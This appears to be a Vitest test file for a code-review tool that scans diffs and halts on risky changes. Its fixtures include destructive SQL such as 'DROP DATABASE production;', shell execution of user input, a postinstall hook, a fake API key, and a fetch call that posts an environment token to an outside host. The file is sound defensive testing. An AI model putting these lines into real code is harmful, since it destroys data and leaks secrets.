import { describe, expect, it } from "vitest";
import { fileURLToPath } from "node:url";
import { defaultConfig, loadConfig } from "../src/config.js";
import { authAndSecretsRule } from "../src/rules/auth-and-secrets.js";
import { configuredHaltPatternsRule } from "../src/rules/configured-halt-patterns.js";
import { dependencyChangesRule } from "../src/rules/dependency-changes.js";
import { destructiveOpsRule } from "../src/rules/destructive-ops.js";
import { networkAndExecRule } from "../src/rules/network-and-exec.js";
import { sensitiveFilesRule } from "../src/rules/sensitive-files.js";
import type { DiffFile } from "../src/types.js";

function diffFile(path: string, addedLines: string[] = []): DiffFile {
  return {
    path,
    additions: addedLines.length,
    deletions: 0,
    addedLines,
    removedLines: [],
    isDeleted: false,
    isNew: false
  };
}

describe("rule modules", () => {
  it("flags protected paths and GitHub workflow changes separately", () => {
    const findings = sensitiveFilesRule([
      diffFile("src/auth/session.ts"),
      diffFile(".github/workflows/ci.yml")
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "protected-path-change",
        severity: "medium",
        score: 20,
        files: ["src/auth/session.ts", ".github/workflows/ci.yml"]
      }),
      expect.objectContaining({
        ruleId: "github-workflow-change",
        severity: "high",
        score: 25,
        files: [".github/workflows/ci.yml"]
      })
    ]));
  });

  it("halts when a secret-like value is added and redacts evidence", () => {
    const findings = authAndSecretsRule([
      diffFile("src/config.ts", ["const apiKey = '1234567890abcdef1234567890';"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "secret-like-string-added",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["src/config.ts"]
      })
    ]);
    expect(findings[0]?.evidence?.[0]).toContain("[redacted]");
  });

  it("halts package lifecycle scripts in dependency manifests", () => {
    const findings = dependencyChangesRule([
      diffFile("package.json", ["  \"postinstall\": \"node scripts/install.js\""])
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "dependency-manifest-change",
        severity: "medium",
        score: 20,
        files: ["package.json"]
      }),
      expect.objectContaining({
        ruleId: "install-script-added",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["package.json"]
      })
    ]));
  });

  it("halts destructive SQL operations with evidence", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/20260626_drop_users.sql", ["DROP TABLE users;"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "drop-table",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["migrations/20260626_drop_users.sql"],
        evidence: ["DROP TABLE users;"]
      })
    ]);
  });

  it("halts added lines that match configured halt patterns", () => {
    const config = { ...defaultConfig, haltPatterns: ["DEBUG = True"] };
    const findings = configuredHaltPatternsRule([
      diffFile("project/settings.py", ["DEBUG = true"])
    ], config);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "configured-halt-pattern",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["project/settings.py"],
        evidence: ["DEBUG = True"]
      })
    ]);
  });

  it("halts destructive database/schema drops", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/001.sql", ["DROP DATABASE production;"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({ ruleId: "drop-database", severity: "critical", score: 100, halt: true })
    ]);
  });

  it("halts a schema-qualified broad delete", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/002.sql", ["DELETE FROM app.users;"])
    ], defaultConfig);

    expect(findings.some((f) => f.ruleId === "broad-delete" && f.halt)).toBe(true);
  });

  it("does not flag a scoped delete with a real WHERE clause", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/003.sql", ["DELETE FROM users WHERE id = 42;"])
    ], defaultConfig);

    expect(findings.some((f) => f.ruleId === "broad-delete")).toBe(false);
  });

  it("flags os.system and subprocess dynamic execution", () => {
    const system = networkAndExecRule([diffFile("run.py", ["os.system(user_input)"])], defaultConfig);
    expect(system.some((f) => f.ruleId === "dynamic-execution-added")).toBe(true);

    const sub = networkAndExecRule([diffFile("run.py", ["subprocess.Popen(cmd, shell=True)"])], defaultConfig);
    expect(sub.some((f) => f.ruleId === "dynamic-execution-added")).toBe(true);
  });

  it("detects network egress near environment access", () => {
    const findings = networkAndExecRule([
      diffFile("src/export.ts", [
        "const token = process.env.API_TOKEN;",
        "await fetch('https://example.com/collect', { method: 'POST', body: token });"
      ])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "network-egress-with-env-access",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["src/export.ts"]
      })
    ]);
  });

  it("matches Node/Express policy pack protected middleware, guards, and workflow/package files", () => {
    const config = loadConfig(fileURLToPath(new URL("../policy-packs/node-express.yml", import.meta.url)));
    const findings = sensitiveFilesRule([
      diffFile("src/middleware/auth.ts"),
      diffFile("src/middleware/session.ts"),
      diffFile("src/middleware/jwt.ts"),
      diffFile("src/routes/admin/guard.ts"),
      diffFile("package.json"),
      diffFile(".github/workflows/ci.yml")
    ], config);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "protected-path-change",
        files: [
          "src/middleware/auth.ts",
          "src/middleware/session.ts",
          "src/middleware/jwt.ts",
          "src/routes/admin/guard.ts",
          "package.json",
          ".github/workflows/ci.yml"
        ]
      }),
      expect.objectContaining({
        ruleId: "github-workflow-change",
        files: [".github/workflows/ci.yml"]
      })
    ]));
  });

  it("matches Python/Django policy pack protected auth, permissions, middleware, migrations, and settings files", () => {
    const config = loadConfig(fileURLToPath(new URL("../policy-packs/python-django.yml", import.meta.url)));
    const findings = sensitiveFilesRule([
      diffFile("app/auth/backends.py"),
      diffFile("app/permissions.py"),
      diffFile("app/middleware.py"),
      diffFile("app/migrations/0001_initial.py"),
      diffFile("project/settings.py"),
      diffFile("manage.py"),
      diffFile("wsgi.py"),
      diffFile("asgi.py"),
      diffFile("requirements.txt")
    ], config);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "protected-path-change",
        files: [
          "app/auth/backends.py",
          "app/permissions.py",
          "app/middleware.py",
          "app/migrations/0001_initial.py",
          "project/settings.py",
          "manage.py",
          "wsgi.py",
          "asgi.py",
          "requirements.txt"
        ]
      })
    ]));
  });
});
